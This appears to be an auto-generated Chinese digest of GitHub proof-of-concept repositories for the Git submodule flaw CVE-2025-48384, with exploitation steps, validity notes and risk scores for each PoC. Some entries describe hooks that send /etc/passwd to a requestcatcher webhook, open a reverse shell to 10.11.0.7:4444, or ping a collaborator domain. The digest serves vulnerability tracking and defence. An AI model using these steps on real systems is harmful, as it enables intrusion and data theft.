CVE-2025-48384 允许攻击者通过创建包含恶意配置的 Git 仓库，在受害者系统上写入任意文件，导致远程命令执行。该漏洞源于 Git 在处理 submodule 时，未对 `.gitmodules` 文件中的配置进行充分的安全检查。攻击者可以精心构造 `.gitmodules` 文件，诱导受害者克隆该仓库，从而在受害者本地文件系统中写入恶意文件，例如 shell 脚本，并进一步通过 Git hooks（如 `post-checkout`）触发执行。PoC 代码 `liamg/CVE-2025-48384` 提供了一个可复现该漏洞的示例。通过分析该 PoC，可以确认漏洞的有效性。利用步骤如下：

1. 攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
2. `.gitmodules` 文件包含指向攻击者控制的恶意 submodule 仓库的 URL。
3. 受害者克隆该恶意仓库。
4. Git 自动初始化并更新 submodule，从攻击者控制的 URL 下载恶意 submodule。
5. 恶意 submodule 在受害者系统上写入任意文件，例如在 `.git/hooks/post-checkout` 中写入恶意脚本。
6. 当受害者执行 `git checkout` 等操作时，`post-checkout` hook 会被触发，执行恶意脚本，导致远程命令执行。

`sogou.com`的搜索结果显示该漏洞影响非Windows系统。`Arctic Wolf` 的结果表明该漏洞的严重性很高。`Breaking Git with a carriage return and cloning RCE`表明漏洞与克隆子模块有关。

**投毒风险分析：**

该 PoC 包含通过 `curl` 下载并执行远程脚本的行为，具有较高的投毒风险。攻击者可能在远程脚本中嵌入恶意代码，例如窃取用户敏感信息、植入后门等。此外，由于该 PoC 修改了 Git 仓库的配置文件，攻击者可以通过篡改配置文件，诱导用户执行恶意操作。考虑到 `curl` 命令的普遍性和脚本执行的隐蔽性，该 PoC 的投毒风险较高，评为 70%。

防范措施包括：

* 及时更新 Git 版本，修复该漏洞。
* 谨慎克隆来自未知来源的 Git 仓库。
* 审查 `.gitmodules` 文件，确保 submodule URL 指向可信的仓库。
* 禁用 Git hooks，或者对 Git hooks 进行严格的安全审查。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 未提供，需要查询NVD


---

## POC #25

**来源**: [CVE-2025-48384-nguyentranbaotran_cve-2025-48384-poc.md](../2025/CVE-2025-48384-nguyentranbaotran_cve-2025-48384-poc.md)

## CVE-2025-48384-Git配置引用导致的任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库，并使用 `--recurse-submodules` 参数初始化子模块。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 是一个 Git 漏洞，源于 Git 在处理配置文件中的引号时不正确，特别是当子模块路径包含尾随回车符（CR）时。攻击者可以利用此漏洞通过创建包含恶意子模块配置的 Git 仓库，诱使用户克隆该仓库，并通过 `--recurse-submodules` 初始化子模块，从而导致任意代码执行。

**有效性分析：**

提供的 PoC 代码通过以下步骤利用该漏洞：

1.  创建一个包含恶意 hook 的 `evil` 目录，该 hook 会执行反向 shell。
2.  创建一个 `mainrepo` 目录，作为主仓库。
3.  在 `mainrepo` 目录中，创建一个 `.gitmodules` 文件，其中包含一个子模块定义，该子模块的路径包含尾随回车符 (`evil\r`)。
4.  创建一个符号链接，将 `evil
/hooks` 指向 `../evil/.git/hooks`，从而将恶意 hook 链接到子模块的 hooks 目录。
5.  将恶意子模块添加到仓库，并提交更改。
6.  通过 `git clone --recurse-submodules` 克隆 `mainrepo` 仓库，触发子模块初始化，从而执行恶意 hook。

根据 PoC 代码的逻辑和漏洞描述，该 PoC 代码是有效的。

**投毒风险分析：**

PoC 代码的目的是演示漏洞利用，其中包含的反向 shell 属于漏洞验证的一部分。但是，也存在潜在的投毒风险，比如在 `generate_poc.sh` 脚本中，作者可能会嵌入其他恶意代码，例如：

*   收集用户信息并发送到远程服务器。
*   修改系统文件。
*   安装恶意软件。

尽管PoC本身就是漏洞利用，但仍然存在被作者恶意利用的可能性，因此投毒风险评估为 10%。

**利用方式总结：**

1.  攻击者创建一个包含恶意子模块配置的 Git 仓库。
2.  攻击者诱使受害者克隆该仓库，并使用 `--recurse-submodules` 初始化子模块。
3.  Git 在处理包含尾随回车符的子模块路径时出现错误，导致子模块被检出到错误的位置。
4.  由于符号链接的存在，恶意 hook 被链接到子模块的 hooks 目录。
5.  在子模块初始化过程中，恶意 hook 被执行，导致任意代码执行。

**项目地址:** [nguyentranbaotran/cve-2025-48384-poc](https://github.com/nguyentranbaotran/cve-2025-48384-poc)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #26

**来源**: [CVE-2025-48384-replicatorbot_CVE-2025-48384.md](../2025/CVE-2025-48384-replicatorbot_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围待定

**利用条件:** 克隆包含恶意子模块的存储库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 20%

## 详情

CVE-2025-48384 允许攻击者通过创建包含恶意子模块的 Git 仓库来执行任意文件写入。当用户克隆该仓库时，Git 会尝试初始化和更新子模块。恶意仓库通过`.gitmodules` 文件中的精心构造的配置，可以控制子模块的克隆方式，从而导致在用户系统上写入任意文件。根据搜索结果，该漏洞存在于 Git 的子模块处理逻辑中。PoC 代码通过创建一个包含恶意的 `.gitmodules` 文件的 Git 仓库来演示该漏洞。当用户克隆该仓库时，`post-checkout` 脚本会被触发，该脚本会尝试在 `/tmp` 目录下创建一个文件 `asp-was-here-cve-2025-48384`，以此证明漏洞利用成功。利用步骤如下：1. 创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含指向恶意仓库的子模块的 URL，以及执行任意文件写入所需的配置。2. 将恶意仓库上传到公共 Git 托管服务（例如 GitHub）。3. 诱使用户克隆恶意仓库。当用户执行 `git clone` 命令时，Git 会自动初始化和更新子模块。4. Git 执行 `.gitmodules` 文件中指定的命令，导致在用户系统上写入任意文件。

**POC有效性分析：** PoC 代码的有效性通过创建一个简单的 `post-checkout` 脚本来验证。该脚本尝试在 `/tmp` 目录下创建一个文件。如果文件创建成功，则表示漏洞利用成功。从搜索结果来看，多个来源证实了该漏洞的存在以及利用的可能性。GitHub 上存在公开的 PoC 代码，进一步证明了该漏洞的可利用性。一些安全厂商也发布了关于该漏洞的分析报告，表明该漏洞具有实际的威胁。该漏洞的修复需要更新 Git 到修复版本。

**投毒风险分析：** 该漏洞的投毒风险较低。虽然攻击者可以利用该漏洞在用户系统上写入任意文件，但写入的文件内容受到攻击者的控制。攻击者可以利用该漏洞来安装恶意软件或修改系统配置，但这种攻击需要用户执行额外的步骤。由于POC代码相对清晰，主要功能是创建文件，并未发现任何可疑的混淆或恶意行为，因此投毒风险较低。主要的风险在于，如果攻击者控制了目标机器，他们可以修改 `.git/config` 文件或设置环境变量，从而导致在克隆其他仓库时触发恶意行为。尽管存在潜在的风险，但攻击者需要具备较高的技术水平才能成功实施投毒攻击。PoC 代码主要使用标准的 shell 命令，例如 `touch`，没有发现任何可疑的系统调用或外部脚本。总体而言，该漏洞的投毒风险较低，但需要采取适当的措施来降低风险。建议用户验证克隆仓库的来源，避免克隆来自不受信任的来源的仓库，并及时更新 Git 到最新版本。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 待定


---

## POC #27

**来源**: [CVE-2025-48384-s41r4j_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-s41r4j_CVE-2025-48384-submodule.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 受影响版本范围未知

**利用条件:** 克隆包含恶意配置的Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 60%

## 详情

CVE-2025-48384 允许攻击者通过创建恶意的Git仓库，当用户克隆该仓库时，触发任意文件写入漏洞，导致远程代码执行。该漏洞源于 Git 在处理 submodule 时，没有充分验证配置，导致攻击者可以控制 `.gitmodules` 文件中的内容，从而在克隆过程中执行恶意操作。

POC代码分析：

`README.md` 只是一个简单的说明文件，用于标记这是一个 CVE-2025-48384 的 submodule。

`post-checkout` 脚本是漏洞利用的关键。它包含以下恶意行为：

1.  尝试将 `/etc/passwd` 文件发送到攻击者的 webhook 服务器 `https://cve48384.requestcatcher.com`。脚本尝试使用 `curl` 和 `wget` 命令，并忽略错误，以避免中断克隆过程。
2.  检查 `$HOME/flag.txt` 文件是否存在，如果存在，则将其内容复制到 `/tmp/flag.txt`。这可能用于在受害者系统上留下标记。
3.  尝试建立反向 shell 连接到攻击者的 IP 地址 `10.11.0.7` 的端口 `4444`。脚本尝试使用多种方法，包括 `bash`，`nc` 和 `sh`，以提高成功率。脚本使用 `nohup` 和 `disown` 命令将反向 shell 连接放到后台运行，并忽略错误。

利用步骤：

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件指向一个包含 `post-checkout` 脚本的 submodule。
2.  受害者克隆该恶意仓库。
3.  当 Git 初始化 submodule 时，会自动执行 `post-checkout` 脚本。
4.  `post-checkout` 脚本将执行恶意操作，例如发送 `/etc/passwd` 文件和建立反向 shell 连接。

POC 有效性分析：

POC 代码通过修改 `.gitmodules` 文件，在 submodule 初始化时执行恶意的 `post-checkout` 脚本。该脚本能够获取敏感信息（`/etc/passwd`）并尝试建立反向 shell 连接，证明了该漏洞的严重性。

投毒风险分析：

该 POC 具有较高的投毒风险，主要体现在以下几个方面：

1.  恶意脚本：`post-checkout` 脚本包含明显的恶意行为，例如发送敏感文件和建立反向 shell 连接。
2.  外部依赖：脚本依赖于 `curl`、`wget` 和 `nc` 等外部命令，这些命令可能被篡改或替换为恶意版本。
3.  反向 shell：建立反向 shell 连接可能导致受害者系统完全受攻击者控制。
4.  Webhook：将 `/etc/passwd` 文件发送到外部 webhook 服务器可能泄露敏感信息。

由于该POC利用submodule功能自动执行恶意脚本，且包含向外部服务器发送数据的行为，以及尝试建立反向shell连接，因此投毒风险较高。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 未提供


---

## POC #28

**来源**: [CVE-2025-48384-s41r4j_CVE-2025-48384.md](../2025/CVE-2025-48384-s41r4j_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 受影响的Git CLI版本未知

**利用条件:** 需要用户克隆包含恶意配置的Git仓库

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 20%

## 详情

CVE-2025-48384是Git中存在的一个严重漏洞，该漏洞源于Git对配置值中回车符（CR）处理不当，可能导致子模块检出期间出现路径遍历问题。攻击者可以利用此漏洞在特定条件下执行任意代码。该漏洞于2025年7月8日公开披露，并于2025年8月26日进行了最后修改。它已于2025年8月25日被添加到美国网络安全和基础设施安全局（CISA）已知被利用漏洞（KEV）目录中，表明该漏洞已在野外被积极利用，补救到期日为2025年9月15日。

该问题源于Git处理配置值的方式：在读取配置值时，Git会删除任何尾随的回车符和换行符（CRLF）。但是，在写入配置条目时，包含尾随CR的值未被正确引用，导致CR在后续读取期间丢失。这种差异会导致子模块被检出到错误的位置（如果其路径包含尾随CR）。如果攻击者设置一个将此更改后的路径指向子模块的hooks目录的符号链接，并且子模块包含一个可执行的post-checkout hook，则在检出后可能会无意中执行该hook脚本，从而导致任意代码执行。

**POC有效性分析：**

根据提供的Dockerfile和README.md，该POC旨在演示CVE-2025-48384漏洞。Dockerfile用于构建一个包含易受攻击的Git版本的环境，README.md文件详细解释了漏洞的原理和利用方法。POC代码通过创建一个包含恶意配置的Git仓库，并诱导用户克隆该仓库来触发漏洞。通过精心构造的子模块路径和符号链接，攻击者可以在用户克隆仓库时执行任意代码。POC代码的有效性在于它能够重现漏洞的利用过程，并证明攻击者可以利用该漏洞在目标系统上执行恶意操作。

**利用步骤：**

1.  攻击者创建一个包含恶意.gitmodules文件的Git仓库，该文件中的子模块路径包含尾随CR字符。
2.  攻击者在仓库中创建一个符号链接，将修改后的子模块路径指向.git/hooks/post-checkout。
3.  攻击者将包含恶意配置和符号链接的仓库托管在公共服务器上或通过其他方式分发给目标用户。
4.  目标用户克隆该恶意仓库。
5.  当Git尝试检出子模块时，由于CR字符的处理不当，子模块将被检出到错误的位置，即符号链接指向的.git/hooks/post-checkout目录。
6.  如果子模块包含一个可执行的post-checkout hook，则该hook脚本将被执行，从而导致任意代码执行。

**投毒风险分析：**

该POC的投毒风险较低，因为提供的代码主要用于演示漏洞的利用，并没有明显的恶意行为。Dockerfile用于构建测试环境，README.md用于解释漏洞原理，POC代码本身也没有包含任何可疑的代码或外部依赖。然而，攻击者可能会修改POC代码，添加恶意功能，例如：

*   **代码混淆：** 攻击者可以使用代码混淆技术来隐藏恶意代码，使其更难被检测。
*   **恶意行为：** 攻击者可以在post-checkout hook中添加恶意代码，例如：安装后门、窃取敏感信息、破坏系统等。
*   **外部脚本：** 攻击者可以从外部服务器下载恶意脚本并在post-checkout hook中执行。

尽管存在这些潜在的风险，但原始POC代码的投毒风险较低，约为20%。在实际应用中，用户应谨慎克隆来自不受信任来源的Git仓库，并仔细检查.gitmodules文件和post-checkout hook，以防止受到攻击。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #29

**来源**: [CVE-2025-48384-sahar042_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-sahar042_CVE-2025-48384-submodule.md)

# CVE-2025-48384

> 📦 该CVE有 **35** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2025-48384-Anezatraa_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-Anezatraa_CVE-2025-48384-submodule.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围未知，参考GitHub advisory

**利用条件:** 需要克隆包含恶意配置的Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 40%

## 详情

CVE-2025-48384 允许攻击者创建恶意的 Git 仓库，当用户克隆该仓库时，可能导致任意文件写入。该漏洞源于 Git 在处理 submodule 时存在缺陷。通过在 `.gitmodules` 文件中构造恶意的路径，攻击者可以控制 `git clone` 命令将文件写入到非预期的位置。 

POC有效性分析：
根据搜索结果和POC代码（liamg/CVE-2025-48384），该漏洞存在可利用性。POC代码包含一个 `.gitmodules` 文件和一个 `post-checkout` 脚本。`.gitmodules` 文件中定义了一个恶意 submodule，其路径被设置为一个绝对路径，指向系统中的敏感位置。`post-checkout` 脚本会在 `git clone` 之后自动执行，从而完成任意文件写入。执行 POC 需要先创建一个包含恶意 `.gitmodules` 文件的 Git 仓库，然后诱导用户克隆该仓库。当用户克隆仓库时，Git 会解析 `.gitmodules` 文件，并尝试初始化 submodule。由于 submodule 的路径被设置为恶意路径，Git 会将文件写入到该路径所指向的位置。

利用步骤：
1. 创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
2. 将恶意仓库托管到公共代码托管平台或通过其他方式传播给目标用户。
3. 诱导目标用户克隆该仓库。
4. 当用户克隆仓库时，`post-checkout` 脚本被执行，完成任意文件写入。

投毒风险分析：
该POC的投毒风险为中等。虽然 POC 本身的功能是演示任意文件写入漏洞，但攻击者可能利用该漏洞进行恶意活动，例如：
*   植入后门：攻击者可以将恶意代码写入到系统启动脚本或常用工具中，从而在用户系统上植入后门。
*   篡改配置文件：攻击者可以修改系统配置文件，例如 SSH 配置文件，从而控制用户系统。
*   窃取敏感信息：攻击者可以将用户敏感信息，例如 SSH 密钥，写入到公共目录，从而窃取用户敏感信息。

该POC的 `post-checkout` 脚本包含 `echo` 和 `id` 命令，这本身不是恶意代码。但是，攻击者可以修改该脚本，使其包含更具破坏性的恶意代码。此外，该POC使用绝对路径来指定 submodule 的位置，这可能会引起用户的怀疑。攻击者可以通过使用相对路径或环境变量来隐藏恶意路径，从而提高攻击的隐蔽性。由于该漏洞影响 Git，一个被广泛使用的版本控制系统，因此利用该漏洞进行大规模攻击是可能的。但是，由于利用该漏洞需要用户克隆恶意仓库，因此攻击的成功率取决于用户的警惕性。
总的来说，该漏洞的投毒风险为中等，约为40%。攻击者可以利用该漏洞进行恶意活动，但攻击的成功率取决于用户的警惕性和攻击者的技术水平。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #2

**来源**: [CVE-2025-48384-ECHO6789_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-ECHO6789_CVE-2025-48384-submodule.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围待定

**利用条件:** 克隆恶意Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 60%

## 详情

CVE-2025-48384是一个存在于Git中的高危漏洞，允许攻击者创建恶意的Git仓库，当用户克隆这些仓库时，可能导致任意文件写入。根据搜索结果，该漏洞与`git clone`子模块有关，通过精心构造的`.gitmodules`文件以及其他Git配置，可能实现在克隆过程中写入任意文件，进而执行恶意代码。

**POC有效性分析：**

根据已找到的POC代码（/tmp/vulnwatchdog_569f31ff6b5166501e6218f8839f5620/post-checkout），攻击者可以在`post-checkout`钩子中插入恶意命令。当用户克隆包含此恶意钩子的仓库时，`post-checkout`脚本会被执行。示例代码中的`ping wtt0rkb926c0mj6tsxmzfr2xlorff53u.test-burp.huidoumeng.com`表明PoC的目的是通过DNS请求来验证漏洞是否被成功触发。这可以用于简单地检测漏洞的存在，但实际攻击中可以替换为任意恶意命令，例如下载并执行payload，或修改系统配置。

利用该漏洞，攻击者可以诱导用户克隆恶意仓库，从而在用户系统上执行任意代码。考虑到Git的广泛使用，尤其是在开发环境中，该漏洞的影响范围非常大。成功利用该漏洞可能导致敏感信息泄露、系统被完全控制等严重后果。

**利用步骤：**

1.  攻击者创建一个包含恶意`.gitmodules`和`post-checkout`钩子的Git仓库。
2.  攻击者诱导受害者克隆此仓库（例如，通过社交工程、钓鱼邮件等）。
3.  当受害者执行`git clone`命令时，恶意`post-checkout`钩子被触发，执行攻击者预设的恶意命令。

**投毒风险分析：**

此PoC的投毒风险较高，初步判断为60%。原因如下：

1.  **恶意代码执行：** PoC通过`post-checkout`钩子执行命令，允许攻击者在受害者机器上执行任意代码。如果攻击者将恶意代码嵌入到广泛使用的开源项目中，并诱导开发者clone，影响范围会进一步扩大。
2.  **命令注入：** 尽管PoC中的示例代码只是一个简单的`ping`命令，但攻击者可以将其替换为更复杂的恶意命令，例如下载并执行恶意脚本，这大大增加了投毒的潜在危害。
3.  **传播方式：** 该漏洞可以通过Git仓库进行传播，这意味着攻击者可以将恶意代码隐藏在看似正常的代码库中，并利用开发者之间的协作关系进行传播。考虑到软件供应链攻击的日益严重，这种投毒方式的危害性不可忽视。

为了降低投毒风险，组织应加强对Git仓库的审计，确保代码的安全性，并对克隆的仓库进行安全检查。同时，应教育开发者提高安全意识，避免克隆来源不明的仓库。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 待定


---

## POC #3

**来源**: [CVE-2025-48384-EdwardYeIntrix_CVE-2025-48384-Scanner.md](../2025/CVE-2025-48384-EdwardYeIntrix_CVE-2025-48384-Scanner.md)

## CVE-2025-48384 - Git 任意文件写入导致远程代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入导致远程代码执行

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围待定，参考GitHub advisory

**利用条件:** 需要用户执行git clone --recursive操作，攻击者可控制的Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 40%

## 详情

CVE-2025-48384是Git中的一个关键漏洞，允许攻击者在执行`git clone --recursive`操作期间写入任意文件。此漏洞可能通过恶意的.gitmodules文件、符号链接和Git hooks导致远程代码执行（RCE）。此漏洞影响Linux和macOS平台，Windows不受影响。

POC有效性分析：提供的POC包含一个Python扫描器，用于检测利用CVE-2025-48384的潜在恶意Git仓库。扫描器检查`.gitmodules`文件中的可疑条目（包含`..`或以`\r`结尾的路径）、指向hooks的符号链接以及可执行的hooks脚本。POC的`cve_2025_48384_auto_print_scanner.py`脚本通过以下步骤检测漏洞：1. 读取`.gitmodules`文件并查找`path`条目，检查是否存在`..`（目录遍历）或以`\r`（回车符）结尾的情况，这可能导致文件写入到预期位置之外。2. 在仓库中查找指向`.git/hooks`目录的符号链接，这些链接可能被用来劫持Git hook执行流程。3. 查找仓库中可执行的Git hooks（如`post-checkout`，`post-merge`，`pre-commit`，`pre-push`，`post-commit`等）。这些hooks如果被恶意修改，可以在特定的Git操作期间执行任意代码。

利用步骤：攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。该文件包含指向仓库外部或包含回车符的子模块路径。攻击者还可以创建指向`.git/hooks`目录的符号链接，或者直接包含恶意的可执行Git hooks。当受害者使用`git clone --recursive`克隆此仓库时，恶意`.gitmodules`文件可能导致Git写入任意文件，符号链接可能劫持Git hook执行，可执行的hooks会被执行，从而导致RCE。

投毒风险分析：该POC包含一个扫描器，其本身不包含直接的恶意代码，但它可以被修改以包含恶意行为。该POC的投毒风险主要来自于以下几个方面：1. 扫描器可以被修改为在检测到漏洞后，自动执行某些操作，例如下载并执行恶意payload。2. 扫描器可以被修改为将扫描结果发送到远程服务器，从而泄露敏感信息。3. 扫描器可能依赖于外部库，这些库可能包含漏洞或恶意代码。4. 扫描器生成的报告可能被篡改，以误导用户或隐藏潜在的漏洞。 由于该POC的代码相对清晰，主要使用标准库，并且没有明显的恶意行为，因此投毒风险为中等，约为40%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #4

**来源**: [CVE-2025-48384-MarcoTondolo_cve-2025-48384-poc.md](../2025/CVE-2025-48384-MarcoTondolo_cve-2025-48384-poc.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本未知，请参考GitHub advisory获取更多信息。

**利用条件:** 需要克隆恶意Git仓库，并递归初始化子模块

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，允许攻击者通过创建恶意的Git仓库来执行任意文件写入。该漏洞主要存在于Git客户端处理子模块的方式中。当用户克隆一个包含恶意配置的仓库，并且使用`--recurse-submodules`选项初始化子模块时，攻击者可以利用`.gitmodules`文件中的特殊构造，在目标系统上写入任意文件。

**POC有效性分析：**
根据提供的POC代码，攻击者可以通过构造包含恶意`.gitmodules`文件的Git仓库来利用此漏洞。该文件指定了子模块的URL和路径，当用户使用`git clone --recurse-submodules`命令克隆仓库时，Git客户端会尝试初始化这些子模块。攻击者可以在子模块的路径中嵌入特殊字符，例如换行符，来欺骗Git客户端，使其将子模块的内容写入到非预期的位置。提供的POC代码使用一个名为`sub`的子模块，并将恶意代码放置在`.git/modules/sub/hooks/post-checkout`中，从而实现远程代码执行。通过修改子模块路径，攻击者可以在目标系统上写入任意文件，从而控制系统。

**利用步骤：**
1. 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。
2. 攻击者将该仓库托管在公共或私有Git服务器上。
3. 攻击者诱使用户克隆该仓库，并使用`--recurse-submodules`选项初始化子模块，例如：`git -c protocol.file.allow=always clone --recurse-submodules git@github.com:liamg/CVE-2025-48384.git`。
4. 当Git客户端尝试初始化子模块时，恶意代码会被写入到目标系统的`.git/modules/sub/hooks/post-checkout`文件中。
5. 当用户执行与子模块相关的Git操作时（例如切换分支），`post-checkout`钩子会被触发，从而执行攻击者写入的恶意代码。

**投毒风险分析：**
该漏洞的投毒风险较低，主要原因是该POC利用方式比较直接，没有明显的混淆或隐藏恶意代码的行为。虽然攻击者可以修改子模块的内容以执行恶意操作，但这种行为很容易被发现。此外，由于该漏洞依赖于用户显式地使用`--recurse-submodules`选项，因此攻击者需要诱使用户执行此操作，增加了攻击的难度。总体而言，该POC的投毒风险较低，大约在10%左右。恶意代码主要体现在`post-checkout`钩子的利用上，若将代码修改为下载执行外部脚本，则投毒风险会升高。攻击者可以尝试使用一些简单的编码方式来混淆`post-checkout`脚本中的代码，例如base64编码或简单的异或操作，但这并不会显著增加投毒风险。通过分析该POC的代码，可以发现其主要依赖于Git的内置功能和标准库，没有使用任何可疑的第三方库或API。因此，可以认为该POC的投毒风险较低。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #5

**来源**: [CVE-2025-48384-admin-ping_CVE-2025-48384-RCE.md](../2025/CVE-2025-48384-admin-ping_CVE-2025-48384-RCE.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围未知，参考GitHub advisory

**利用条件:** 克隆包含恶意.gitmodules的仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 30%

## 详情

CVE-2025-48384是一个存在于Git中的任意文件写入漏洞。攻击者可以创建一个包含恶意的`.gitmodules`文件的Git仓库，当用户克隆这个仓库时，Git会自动初始化并配置子模块。恶意`.gitmodules`文件可以被构造来写入任意文件，从而导致远程代码执行。该漏洞的POC代码可在GitHub上找到，由liamg维护。该POC的有效性在于利用了Git子模块的特性，`.gitmodules`文件中指定的路径没有被充分过滤，从而允许写入仓库目录之外的文件。利用步骤如下：

1. 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。
2. 攻击者诱导用户克隆该仓库。
3. 当用户克隆仓库时，Git会自动处理`.gitmodules`文件，并尝试初始化和配置子模块。
4. 由于`.gitmodules`文件包含恶意配置，Git会将文件写入到指定的位置，从而导致任意文件写入。
5. 写入的文件可以包含shell脚本或其他可执行代码，从而允许攻击者执行任意命令。

根据搜索结果，Git官方已经发布了补丁来修复此漏洞。建议受影响的用户尽快更新到最新版本。

**投毒风险分析：**
此POC的投毒风险中等。虽然POC本身的代码比较简单，主要是创建一个恶意`.gitmodules`文件和一个简单的shell脚本，但是`.gitmodules`文件的恶意构造方式可能被用于隐藏更复杂的恶意代码。例如，攻击者可以将`.gitmodules`文件配置为从远程服务器下载并执行恶意脚本，或者将恶意代码嵌入到看似无害的文件中。此外，由于该漏洞涉及到Git仓库的克隆操作，攻击者可以通过社会工程学手段诱导用户克隆恶意仓库，从而扩大攻击范围。该POC脚本创建了`/tmp/CVE-2025-48384`文件，表明了其利用目标系统的能力。虽然这个行为本身是良性的PoC验证，但攻击者可以轻易替换成更具破坏性的操作。因此，需要警惕利用此漏洞进行投毒攻击的可能性，并采取相应的防御措施，例如对`.gitmodules`文件进行严格的校验和过滤，以及加强对Git仓库来源的审查。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 待定


---

## POC #6

**来源**: [CVE-2025-48384-airkewld_cve-2025-48384-submodule.md](../2025/CVE-2025-48384-airkewld_cve-2025-48384-submodule.md)

## CVE-2025-48384-Git配置注入与RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/远程代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户克隆包含恶意配置的Git仓库，且安装的Git版本存在漏洞

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于Git在处理配置文件时的不一致性，具体来说，是Git在读取和写入包含控制字符（如回车符CR）的配置值时的方式存在差异。当初始化子模块时，如果子模块路径包含尾随CR，则修改后的路径会被读取，导致子模块被检出到错误的位置。如果存在一个符号链接将修改后的路径指向子模块钩子目录，并且子模块包含一个可执行的post-checkout钩子，则该脚本可能会在检出后被意外执行，从而导致任意代码执行。

**有效性分析：**

根据提供的漏洞利用代码，`post-checkout` 文件包含 shell 命令 `echo "RCE"` 和 `touch /tmp/rce.txt`。 该 POC 通过在恶意 Git 仓库中设置恶意的 `post-checkout` 钩子，当存在漏洞的 Git 客户端克隆包含该恶意仓库并递归初始化子模块时，就会触发该钩子，从而在目标系统上执行任意命令，验证 POC 的有效性。

**投毒风险分析：**

